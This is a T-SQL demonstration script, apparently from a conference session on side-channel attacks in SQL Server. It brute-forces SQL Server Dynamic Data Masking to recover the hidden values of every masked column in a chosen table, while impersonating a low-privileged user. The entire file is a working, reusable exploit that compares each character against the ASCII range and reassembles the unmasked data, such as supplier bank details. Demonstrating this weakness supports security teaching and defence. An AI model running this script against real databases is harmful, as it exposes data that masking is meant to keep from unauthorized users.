/*******************************************************************
*	Session:	Side Channel Attacks in SQL Server
*	Author:		Ben Johnston
*	Name:		Demo03.Masking.04.Brute.Force.sql
*	Notes:		Complete unmasking of all columns in a table.
********************************************************************/
USE WWISideChannel
GO
SET NOCOUNT ON
SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED
GO

EXECUTE AS USER = 'SideChannelUser'
GO
/*******************************************************************
* Declare and set the variables for this run 
********************************************************************/
DECLARE
    @ServerName					varchar(255)			= 'localhost' --@@SERVERNAME
    ,@SchemaName				varchar(255)			= 'Purchasing'
    ,@TableName					varchar(255)			= 'Suppliers'	--'SuppliersTest' --'SupplierTransactions'
	,@PrimaryKey				varchar(255)			= 'SupplierName'
    ,@EXECUTE					tinyint					= 1		-- 1 = execute, 0 = print
    ,@NOLOCK					tinyint					= 1		--1 = WITH(NOLOCK), 0 = default lock (committed)
    --,@strStandardFlag			varchar(20)
    --,@strStandardCode			varchar(20)
    ,@SHOW_COLUMNS_ONLY			bit						= 0		--1 = columns only and exit, 0 = don't show column list
	,@Exclude					varchar(500)			--= 'BankAccountBranch,BankAccountCode' --CSV list of columns that will be ignored

/*******************************************************************
* Temporary table definitions
********************************************************************/
DECLARE @Columns TABLE (
	ColumnID					int
	,ColumnName					varchar(255)
	,ColumnLength				smallint
	,HasText					tinyint
)

/********************************************************************
* Variables set internally
*********************************************************************/
DECLARE
	@HasText					tinyint
	,@SQL						varchar(max)
	,@InternalWhere				varchar(max)
	,@OrderList					varchar(max)

/*******************************************************************
* Set the columns to include
*
* Find masked columns in the table specified and add them to 
* the @Columns table variable
*
* Set the HasText column to 1 if it is a string based column. The
* comparison dataset can be reduced considerably if only 
* numeric masked columns are present.
********************************************************************/
INSERT INTO @Columns
EXEC (
    'SELECT 
		SC.column_id
		,SC.name
		,CASE 
			WHEN sc.max_length = -1 THEN 100
			--WHEN sc.max_length = 0 THEN 100
			WHEN ST.name IN (' + '''' + 'nchar' + '''' + ',' + '''' + 'nvarchar' + '''' + ') THEN SC.max_length	/ 2
			WHEN ST.name IN (' + '''' + 'char' + '''' + ',' + '''' + 'varchar' + '''' + ') THEN SC.max_length
			ELSE 40 --hard code numbers to 40 wide. Verify this with different scenarios
		END	MaxLength
		,CASE
			WHEN ST.name IN (' + '''' + 'varchar' + '''' 
				+ ',' + '''' + 'nvarchar' + ''''
				+ ',' + '''' + 'char' + ''''
				+ ',' + '''' + 'nchar' + '''' + ') THEN 1
			ELSE 0
		END HasText
    FROM sys.objects SO
        INNER JOIN sys.columns SC
            ON so.object_id = sc.object_id
        INNER JOIN sys.schemas SS
            ON so.schema_id = ss.schema_id
		INNER JOIN sys.types ST
			ON SC.system_type_id	= ST.system_type_id
			AND SC.user_type_id		= ST.user_type_id
		LEFT JOIN string_split(' + '''' + @Exclude + '''' + ',' + '''' + ',' + '''' + ') SSTR
			ON SC.name COLLATE SQL_Latin1_General_CP1_CI_AS 			= SSTR.value COLLATE SQL_Latin1_General_CP1_CI_AS 
    WHERE so.name COLLATE SQL_Latin1_General_CP1_CI_AS = ' + '''' + @TableName + '''' + ' COLLATE SQL_Latin1_General_CP1_CI_AS 
        AND ss.name COLLATE SQL_Latin1_General_CP1_CI_AS = ' + '''' + @SchemaName + '''' + ' COLLATE SQL_Latin1_General_CP1_CI_AS 
        AND ST.system_type_id NOT IN (240)
		AND SC.is_masked				= 1
		AND SSTR.value					IS NULL
    ORDER BY sc.name'
)

--Determines character set to use
SELECT @HasText = MAX(HasText)
FROM @Columns

IF @SHOW_COLUMNS_ONLY = 1
BEGIN
	SELECT * FROM @Columns
	GOTO NO_EXECUTE
END


IF (SELECT COUNT(*) FROM @Columns) = 0
BEGIN
    RAISERROR('No columns present: Check that you are running the script from the correct database, that the name of the table is correct and that you have permission to select from the table.',5,1)
	GOTO NO_EXECUTE
END

/********************************************************************
* Primary Key Columns
*
* The sample script requires a primary key column for it to work
* automatically. The primary key columns for the table specified
* are dynamically inserted into @PrimaryKeys using system tables.
*
* A candidate key can be specified via the @PrimaryKey variable
* if it is not specified on the table but the key is known.
*
* The same purpose could be achieved with ROW_NUMBER() for tables
* without a primary key. 
*********************************************************************/
DECLARE @PrimaryKeys TABLE (
	PrimaryKeyName				sysname
	,ColumnName					sysname
	,RowNumber					int			identity
)

INSERT INTO @PrimaryKeys (
	PrimaryKeyName
	,ColumnName
)
EXEC('
SELECT
	si.name	PrimaryKeyName
	,sc.name	ColumnName
FROM sys.objects so
	INNER JOIN sys.schemas ss
		ON so.schema_id = ss.schema_id
	INNER JOIN sys.indexes si
		ON so.object_id = si.object_id
	INNER JOIN sys.index_columns ic
		ON so.object_id = ic.object_id
		AND si.index_id	= ic.index_id
	INNER JOIN sys.columns sc
		ON ic.object_id = sc.object_id
		AND ic.index_column_id = sc.column_id
WHERE so.name COLLATE SQL_Latin1_General_CP1_CI_AS = ' + '''' + @TableName + '''' + ' COLLATE SQL_Latin1_General_CP1_CI_AS
        AND ss.name COLLATE SQL_Latin1_General_CP1_CI_AS = ' + '''' + @SchemaName + '''' + ' COLLATE SQL_Latin1_General_CP1_CI_AS
		AND SI.is_primary_key = 1
ORDER BY 
	sc.column_id
')

IF (SELECT COUNT(*) FROM @PrimaryKeys) = 0
BEGIN
	IF @PrimaryKey IS NULL GOTO NO_EXECUTE
	ELSE
	BEGIN
		INSERT INTO @PrimaryKeys (PrimaryKeyName,ColumnName)
		VALUES (@PrimaryKey,@PrimaryKey)
	END
END

/********************************************************************
* Internal WHERE Clause for JOINS
*
* Each column has a STUFF statement during the unmasking process.
* This creates the WHERE clause for the STUFF statements
*
* The same @InternalWhere and @OrderList is used for each masked column
*********************************************************************/
SELECT @InternalWhere = ''

SELECT
	@InternalWhere += 
	CASE RowNumber
		WHEN 1 THEN '			WHERE MCI.' + ColumnName + ' = MC.' + ColumnName
		ELSE '			AND MCI.' + ColumnName + ' = MC.' + ColumnName
	END
FROM @PrimaryKeys

/********************************************************************
* Internal ORDER List
*
* The ORDER list for the STUFF statements for each column.
*********************************************************************/
SELECT @OrderList = ''

SELECT
	@OrderList += 
	CASE RowNumber
		WHEN 1 THEN 'MC.' + ColumnName
		ELSE ',MCI.' + ColumnName
	END
FROM @PrimaryKeys

/********************************************************************
* SQL Statement
*
* The Numbers CTE is created first.
* This example is limited to ASCII characters.
* The same thing could be done with a wide character set. It would take 
* longer and exploration of the characters used would be recommended.
*
* The @HasText variable is used to determine if only numeric characters
* are included in teh comparison or if all 255 ASCII characters
* are checked.
* This could be done in the creation below for each column, but is
* just done once for simplicity in this example.
*********************************************************************/
SELECT @SQL = '
' + CASE @NOLOCK WHEN 1 THEN 'SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED

'
ELSE ''
END


SELECT @SQL += '
;
WITH NUMBERS_CTE AS (
	SELECT TOP 255
		ROW_NUMBER() OVER(ORDER BY object_id, column_id) Number
	FROM sys.all_columns
)
,CHARACTERS_CTE AS (
	SELECT
		CHAR(Number) CharValue
	FROM NUMBERS_CTE N
'
	+ CASE @HasText
		WHEN 0 THEN 'WHERE Number IN (45,46) OR Number BETWEEN 48 AND 57 '
		WHEN 1 THEN 'WHERE Number BETWEEN 1 AND 255 '
		
		END
	+ '
)'

/*
* A CTE is created for each column to unmask each character individually.
* The join to NUMBERS_CTE is used to iterate through each character.
* The join to CHARACTERS_CTE is used to determine the unmasked value for each character.
* COLLATE is used to simplify the comparisons by forcing the same collation. It is also
* used to be sure the case and accents are preserved.
*
* Sample generated query section for a CTE follows:
,TransactionDate_CTE AS (
	SELECT 
		*
	FROM [Purchasing].[SupplierTransactions] MT WITH (NOLOCK)
		INNER JOIN NUMBERS_CTE N
			ON N.Number <= LEN(CONVERT(nvarchar(40),MT.TransactionDate))
		LEFT JOIN CHARACTERS_CTE C
			ON SUBSTRING(CONVERT(nvarchar(40),MT.TransactionDate),N.Number,1) COLLATE SQL_Latin1_General_CP1_CS_AS = C.CharValue COLLATE SQL_Latin1_General_CP1_CS_AS
)
*/
SELECT @SQL += '
,' + ColumnName + '_CTE AS (
	SELECT 
		*
	FROM [' + @SchemaName + '].[' + @TableName + '] MT WITH (NOLOCK)
		INNER JOIN NUMBERS_CTE N
			ON N.Number <= LEN(CONVERT(nvarchar(' + CONVERT(varchar(10),ColumnLength) + '),MT.' + ColumnName + '))
		LEFT JOIN CHARACTERS_CTE C
			ON SUBSTRING(CONVERT(nvarchar(' + CONVERT(varchar(10),ColumnLength) + '),MT.' + ColumnName + '),N.Number,1) COLLATE SQL_Latin1_General_CP1_CS_AS = C.CharValue COLLATE SQL_Latin1_General_CP1_CS_AS
)'
FROM @Columns

/* 
* Static columns are specified, then the primary key columns
*/
SELECT @SQL += '

SELECT
    ' + '''' + @ServerName + '''' + ' SERVER_NAME
    ,' + '''' + DB_NAME() + '''' + ' DATABASE_NAME
	,' + '''' + USER_NAME() + '''' + ' USER_NAME
    ,' + '''' + @SchemaName + '''' + ' SCHEMA_NAME
    ,' + '''' + @TableName + '''' + ' TABLE_NAME'

SELECT @SQL += '
	,MC.' + ColumnName
FROM @PrimaryKeys

SELECT @SQL += '
	,' + ColumnName
FROM @Columns

/*
* A STUFF statement is created for each masked column. 
* Note the use of the @InternalWhere and the @OrderList created earlier in the script.
* The SELECT statement uses a correlated subquery to join the internal query back to the 
* parent query. 
*
* STRING_AGG could be used in place of STUFF, but the order of columns isn't guaranteed.
* It was tested and worked, but given that the order is guaranteed it was not used. Likely
* instances when the order would differ is when the clustered index does not align with 
* the primary key.
*
* The query section generated for STUFF format is as follows:
	,STUFF((SELECT ISNULL(MCI.CharValue,'')
			FROM TransactionDate_CTE MCI
			WHERE MCI.SupplierTransactionID = MC.SupplierTransactionID
			ORDER BY 
				MC.SupplierTransactionID,MCI.Number
			FOR XML PATH, TYPE).value(N'.[1]', N'nvarchar(max)'), 1, 0,'') TransactionDate_FromMasked

* The same query section using STRING_AGG follows:
	,(SELECT STRING_AGG(ISNULL(CharValue,''),'')
			FROM TransactionDate_CTE MCI
			WHERE MCI.SupplierTransactionID	= MC.SupplierTransactionID) TransactionDate_FromMasked
*/
SELECT @SQL +=
	'
	,STUFF((SELECT ISNULL(MCI.CharValue,' + '''' + '''' + ')
			FROM ' + ColumnName + '_CTE MCI
'
			+ @InternalWhere
			+ '
			ORDER BY 
				' + @OrderList + ',MCI.Number
			FOR XML PATH, TYPE).value(N' + '''' + '.[1]' + '''' +', N' + '''' + 'nvarchar(max)' + '''' + '), 1, 0,' + '''' + '''' + ') ' + ColumnName + '_FromMasked'
FROM @Columns

SELECT @SQL += '
FROM [' + @SchemaName + '].[' + @TableName + '] MC WITH (NOLOCK)'

SELECT @SQL += '
ORDER BY'

SELECT @SQL += 
	CASE RowNumber
		WHEN 1 THEN '
	MC.' + ColumnName 
		ELSE '
	,MC.' + ColumnName
	END
FROM @PrimaryKeys


BEGIN TRY
	IF @EXECUTE = 1
	BEGIN
		EXEC(@SQL)
	END
	ELSE SELECT @SQL
END TRY
BEGIN CATCH
	SELECT
		ERROR_NUMBER() AS ErrorNumber
		,ERROR_SEVERITY() AS ErrorSeverity
		,ERROR_STATE() AS ErrorState
		,ERROR_PROCEDURE() AS ErrorProcedure
		,ERROR_LINE() AS ErrorLine
		,ERROR_MESSAGE() AS ErrorMessage;
END CATCH


NO_EXECUTE:
GO

REVERT
GO
